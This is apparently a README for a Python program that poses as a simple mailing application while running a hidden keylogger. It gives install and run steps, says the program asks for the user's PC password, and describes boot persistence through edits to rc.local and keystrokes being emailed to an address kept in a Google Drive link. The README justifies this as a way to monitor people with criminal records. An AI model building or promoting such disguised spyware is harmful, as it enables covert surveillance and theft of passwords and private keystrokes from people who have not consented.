## Hidden Keylogger 

It basically provides a mailing service with a hidden keylogger to have a check on people having past criminal records or people involved in any suspicious activity.

### How to use?
  You must have python installed. The open the command terminal in the directory containing app.py.
  Run the command :
    `pip install pynput`
  Then, run command
    `python app.py`
    
It will ask for your user pc password.

### How it works
  Basically, this is a simple mailing application. You use your mail id and password to login and a mail id on which you have to send a mail.Then you will enter the contens of the mail.
  From the moment you first time open this application it will start a hidden keylogger in background untill the terminal session is forced stoped.
  Then it has some commands that will edit the rc.local file which will exexutes its contents on every times the pc boots. So it will execute a command of a hidden keylogger on everytime it boots up. And the key strokes are send to a mail provided in the gooogle drive link.

Some other sensitive info are contained in the drive link.
